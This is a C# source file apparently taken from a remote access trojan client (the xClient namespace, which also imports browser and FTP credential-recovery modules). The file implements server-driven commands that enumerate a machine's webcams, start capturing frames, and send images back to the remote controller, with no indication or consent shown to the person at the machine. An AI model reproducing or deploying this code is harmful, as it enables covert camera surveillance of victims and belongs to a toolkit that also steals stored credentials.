using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using xClient.Core.Helper;
using System.Drawing.Imaging;
using System.Threading;
using xClient.Core.Networking;
using xClient.Core.Utilities;
using xClient.Enums;
using System.Collections.Generic;
using xClient.Core.Data;
using xClient.Core.Recovery.Browsers;
using xClient.Core.Recovery.FtpClients;
using AForge.Video.DirectShow;
using AForge.Video;

namespace xClient.Core.Commands
{


    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT HANDLE WEBCAM COMMANDS. */
    public static partial class CommandHandler
    {
        public static bool webcamStarted = false;
        public static bool needsCapture = false;
        public static Client _client;
        public static int webcam;
        public static VideoCaptureDevice FinalVideo;

        public static void HandleGetWebcams(Packets.ServerPackets.GetWebcams command, Client client)
        {
            List<string> result = new List<string>();
            FilterInfoCollection VideoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            foreach (FilterInfo VideoCaptureDevice in VideoCaptureDevices)
            {
                result.Add(VideoCaptureDevice.Name);
            }
            if (result.Count > 0)
                new Packets.ClientPackets.GetWebcamsResponse(result).Execute(client);
        }


        public static void HandleGetWebcam(Packets.ServerPackets.GetWebcam command, Client client)
        {
            _client = client;
            needsCapture = true;
            webcam = command.Webcam;
            if (!webcamStarted)
            {
                FilterInfoCollection VideoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                FinalVideo = new VideoCaptureDevice(VideoCaptureDevices[command.Webcam].MonikerString);
                FinalVideo.NewFrame += FinalVideo_NewFrame;
                FinalVideo.Start();
                webcamStarted = true;
            }
        }
        public static void HandleDoWebcamStop(Packets.ServerPackets.DoWebcamStop command, Client client)
        {
            needsCapture = false;
            webcamStarted = false;
            FinalVideo.NewFrame -= FinalVideo_NewFrame;
            FinalVideo.Stop();
        }
        private static void FinalVideo_NewFrame(object sender, NewFrameEventArgs e)
        {
            if (!webcamStarted)
                FinalVideo.Stop();

            if (needsCapture)
            {
                byte[] imagegeBytes = new byte[0];
                Bitmap image = (Bitmap)e.Frame.Clone();
                using (MemoryStream stream = new MemoryStream())
                {
                    image.Save(stream, System.Drawing.Imaging.ImageFormat.Bmp);
                    new Packets.ClientPackets.GetWebcamResponse(stream.ToArray(), webcam).Execute(_client);
                    stream.Close();
                }
                needsCapture = false;
            }
        }
    }
}
